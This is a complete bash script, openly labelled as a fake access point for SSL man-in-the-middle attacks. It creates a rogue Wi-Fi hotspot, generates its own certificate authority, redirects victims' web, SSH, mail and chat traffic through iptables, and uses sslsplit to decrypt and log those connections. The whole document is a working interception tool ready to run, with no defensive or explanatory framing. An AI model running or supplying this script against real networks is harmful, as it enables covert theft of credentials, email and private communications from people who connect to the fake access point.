#FAKE Access point - MitM SSL
#<Internet>---(((Attacker AP))---<Victim>
#Tested on Debian/Kali

PIRATE_INT='wlp5s0'
PIRATE_NET='10.5.0.0'
PIRATE_MASK_CIDR='24'
PIRATE_IP='10.5.0.1'
PIRATE_GW=$PIRATE_IP


INTERNET_INT='enp0s29u1u5'
INTERNET_NET=$(ip route list | grep $INTERNET_INT | cut -d' ' -f1 | grep -E '^[0-9]' | cut -d'/' -f1)
INTERNET_MASK_CIDR=$(ip route list | grep $INTERNET_INT | cut -d' ' -f1 | grep -E '^[0-9]' | cut -d'/' -f2)
INTERNET_IP=$(ip -o -4 addr list $INTERNET_INT | awk '{print $4}' | cut -d/ -f1)
INTERNET_GW=$(/sbin/ip route | grep $INTERNET_INT | awk '/default/ { print $3 }')

DNSMASQ_CONF='/etc/dnsmasq.conf'
HOSTAPD_CONF='/etc/hostapd.conf'

DIR_MITM='/tmp/mitm'
DIR_CERT='/tmp/mitm/certs'

LOG_DIR=$DIR_MITM"/sslsplit"
LOG_FILE=$LOG_DIR"/mitmssl.log"
SUBLOG_DIR=$LOG_DIR"/logdir"
PRIVATE=$DIR_CERT"/ca.key"
CERT=$DIR_CERT"/ca.crt"


echo
echo [Attacker configuration]
echo Interface : $PIRATE_INT
echo Network : $PIRATE_NET/$PIRATE_MASK_CIDR
echo Private IP : $PIRATE_IP
echo Gateway : $PIRATE_GW
echo
echo [Internet configuration]
echo Interface : $INTERNET_INT
echo Network : $INTERNET_NET/$INTERNET_MASK_CIDR
echo Private IP : $INTERNET_IP
echo Gateway : $INTERNET_GW
echo
echo [Dnsmasq configuration]
cat $DNSMASQ_CONF | grep -v '#'
echo
echo [SSLSPLIT configuration]
echo MITM directory : $DIR_MITM
echo Cert directory: $DIR_CERT
echo
echo [hostapd configuration]
cat $HOSTAPD_CONF
echo 

# Check root
if [ "$(/usr/bin/id -u)" != "0" ]
then
	echo "This script must be run with root privileges."
	exit
fi

echo Press Return to continue
read a

mkdir $DIR_MITM
mkdir $DIR_CERT
mkdir $LOG_DIR
mkdir $SUBLOG_DIR
cd $DIR_MITM

systemctl stop NetworkManager
systemctl restart dnsmasq.service
ifconfig $PIRATE_INT down

sleep 1
ifconfig $PIRATE_INT $PIRATE_IP/$PIRATE_MASK_CIDR up
sleep 1
xterm -hold -e "watch tail /var/log/dnsmasq.log" &
xterm -hold -e "hostapd /etc/hostapd.conf" &


if [ ! -e $CERT ]
then
openssl genrsa -out $PRIVATE 4096
openssl req -new -x509 -days 1826 -key $PRIVATE -out $CERT
echo Les Certificats $PRIVATE $CERT ont été créé
fi


echo 1 > /proc/sys/net/ipv4/ip_forward

iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X
iptables -t mangle -F
iptables -t mangle -X
iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT
iptables -P FORWARD ACCEPT

iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 8443
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443
iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443
iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443
iptables -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080
iptables -t nat -A POSTROUTING -o $INTERNET_INT -j MASQUERADE


mkdir ./jail
mkdir ./logs
mkdir ./logs/logdir
mkdir logdir
sslsplit -D -l ./con.logs -j ./logs -S logdir -k /tmp/mitm/certs/ca.key -c /tmp/mitm/certs/ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080
